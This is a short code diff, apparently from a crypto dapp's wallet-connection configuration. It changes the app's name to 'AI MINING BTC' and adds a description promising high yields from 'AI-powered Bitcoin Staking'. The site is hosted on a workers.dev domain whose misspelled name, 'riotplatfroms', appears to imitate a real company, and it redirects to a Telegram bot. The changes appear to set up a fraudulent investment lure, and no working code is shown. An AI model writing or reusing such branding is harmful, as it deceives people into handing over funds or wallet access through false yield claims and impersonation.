@@ -14,10 +14,10 @@ const bscMainnet = {
 }
 
 const metadata = {
-    name: 'ATS Infrastructure Network',
-    description: 'Unified administrative portal for distributed network nodes and protocol monitoring.',
+    name: 'AI MINING BTC',
+    description: 'Secure AI-powered Bitcoin Staking Platform. Earn high yields with the latest mining protocol infrastructure.',
     url: 'https://riotnode.riotplatfroms.workers.dev/',
-    icons: ['https://riotnode.riotplatfroms.workers.dev/icon.png'],
+    icons: ['https://riotnode.riotplatfroms.workers.dev/logo.png'],
     redirect: {
         native: 'https://t.me/AiMiningBTC_bot/start',
         universal: 'https://t.me/AiMiningBTC_bot'
